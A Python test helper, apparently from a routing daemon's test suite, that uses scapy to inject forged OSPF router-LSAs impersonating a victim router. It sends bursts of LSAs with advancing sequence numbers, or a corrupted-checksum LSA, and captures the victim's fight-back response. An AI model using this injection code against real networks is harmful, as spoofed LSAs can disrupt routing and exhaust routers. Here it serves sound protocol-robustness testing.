#!/usr/bin/env python3
# SPDX-License-Identifier: ISC
#
# fightback_inject.py
#
# Copyright (c) 2026 Bing Shui <bingshui@smail.nju.edu.cn>
#
"""Sniff OSPF traffic on the attacker-facing interface while injecting
forged self-originated router-LSAs at the victim.

Used by test_ospf_fightback_pacing.py.  Packet layout and timing follow
the original reproducer (topo-fuzz test/manul/ospf_b1_fightback_rate.py):

- an OSPFv2 Link State Update (type 4) carrying one router-LSA whose
  advertising router is the victim, sent from the peer address to the
  victim address with TTL 1 and protocol 89;
- "burst" mode sends COUNT LSAs spaced SPACING apart whose sequence
  numbers advance by two past the victim's current sequence number;
- "invalid" mode sends a single LSA whose checksum is corrupted;
- "baseline" mode only listens.

Prints one line "B1_CAPTURE_JSON=<json>" with the injected packets and
every LSA observed on the wire, relative to capture start.
"""

import argparse
import json
import socket
import struct
import time

from scapy.all import IP, AsyncSniffer, Raw, conf, send, wrpcap

conf.verb = 0


def internet_checksum(data):
    if len(data) % 2:
        data += b"\x00"
    total = sum(struct.unpack("!%dH" % (len(data) // 2), data))
    total = (total & 0xFFFF) + (total >> 16)
    total = (total & 0xFFFF) + (total >> 16)
    return (~total) & 0xFFFF


def make_lsa(target_rid, sequence, corrupt):
    body = struct.pack("!BBH", 0, 0, 0)
    lsa = bytearray(
        struct.pack("!HBB", 1, 0x02, 1)
        + socket.inet_aton(target_rid)
        + socket.inet_aton(target_rid)
        + struct.pack("!IHH", sequence, 0, 24)
        + body
    )
    data = bytearray(lsa[2:])
    c0 = 0
    c1 = 0
    for value in data:
        c0 = (c0 + value) % 255
        c1 = (c1 + c0) % 255
    offset = 14
    x = ((len(data) - offset - 1) * c0 - c1) % 255
    if x == 0:
        x = 255
    y = 510 - c0 - x
    if y > 255:
        y -= 255
    data[offset] = x
    data[offset + 1] = y
    lsa = bytearray(lsa[:2] + data)
    c0 = 0
    c1 = 0
    for value in lsa[2:]:
        c0 = (c0 + value) % 255
        c1 = (c1 + c0) % 255
    assert c0 == 0 and c1 == 0
    if corrupt:
        lsa[16] ^= 0x5A
    return bytes(lsa)


def make_packet(args, sequence, corrupt):
    lsa = make_lsa(args.target_rid, sequence, corrupt)
    body = struct.pack("!I", 1) + lsa
    length = 24 + len(body)
    header = bytearray(
        struct.pack("!BBH", 2, 4, length)
        + socket.inet_aton(args.peer_rid)
        + socket.inet_aton("0.0.0.0")
        + struct.pack("!HHQ", 0, 0, 0)
    )
    checksum = internet_checksum(bytes(header) + body)
    header[12:14] = struct.pack("!H", checksum)
    return IP(src=args.peer_ip, dst=args.target_ip, ttl=1, proto=89) / Raw(
        bytes(header) + body
    )


def parse_lsas(packets, epoch):
    events = []
    for packet in packets:
        if not packet.haslayer(IP):
            continue
        raw = bytes(packet[IP].payload)
        if len(raw) < 28 or raw[0] != 2 or raw[1] != 4:
            continue
        count = struct.unpack("!I", raw[24:28])[0]
        offset = 28
        for _ in range(count):
            if offset + 20 > len(raw):
                break
            length = struct.unpack("!H", raw[offset + 18 : offset + 20])[0]
            if length < 20 or offset + length > len(raw):
                break
            events.append(
                {
                    "time": round(float(packet.time) - epoch, 6),
                    "src": packet[IP].src,
                    "dst": packet[IP].dst,
                    "ospf_router_id": socket.inet_ntoa(raw[4:8]),
                    "age": struct.unpack("!H", raw[offset : offset + 2])[0],
                    "type": raw[offset + 3],
                    "id": socket.inet_ntoa(raw[offset + 4 : offset + 8]),
                    "adv_router": socket.inet_ntoa(raw[offset + 8 : offset + 12]),
                    "seq": struct.unpack("!I", raw[offset + 12 : offset + 16])[0],
                    "length": length,
                }
            )
            offset += length
    return events


def run(args):
    sniffer = AsyncSniffer(iface=args.iface, filter="ip proto 89", store=True)
    sniffer.start()
    time.sleep(0.4)
    epoch = time.time()
    sent = []
    packets = []
    try:
        if args.mode == "burst":
            for index in range(args.count):
                if index:
                    time.sleep(args.spacing)
                sequence = args.base_seq + 1 + 2 * index
                sent.append(
                    {
                        "time": round(time.time() - epoch, 6),
                        "seq": sequence,
                        "corrupt_checksum": False,
                    }
                )
                send(make_packet(args, sequence, False), iface=args.iface, verbose=0)
            time.sleep(args.tail)
        elif args.mode == "invalid":
            sequence = args.base_seq + 1
            sent.append(
                {
                    "time": round(time.time() - epoch, 6),
                    "seq": sequence,
                    "corrupt_checksum": True,
                }
            )
            send(make_packet(args, sequence, True), iface=args.iface, verbose=0)
            time.sleep(args.tail)
        else:
            time.sleep(args.duration)
    finally:
        try:
            packets = list(sniffer.stop())
        except Exception:
            sniffer.join()
            raise
    wrpcap(args.pcap, packets)
    print(
        "B1_CAPTURE_JSON="
        + json.dumps(
            {
                "sent": sent,
                "lsas": parse_lsas(packets, epoch),
                "pcap_path": args.pcap,
            },
            sort_keys=True,
        )
    )


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--iface", required=True)
    parser.add_argument("--target-ip", required=True)
    parser.add_argument("--peer-ip", required=True)
    parser.add_argument("--target-rid", required=True)
    parser.add_argument("--peer-rid", required=True)
    parser.add_argument(
        "--mode", choices=["baseline", "invalid", "burst"], required=True
    )
    parser.add_argument("--base-seq", type=lambda value: int(value, 0), default=0)
    parser.add_argument("--count", type=int, default=0)
    parser.add_argument("--spacing", type=float, default=0.0)
    parser.add_argument("--tail", type=float, default=1.5)
    parser.add_argument("--duration", type=float, default=2.2)
    parser.add_argument("--pcap", required=True)
    run(parser.parse_args())


if __name__ == "__main__":
    main()
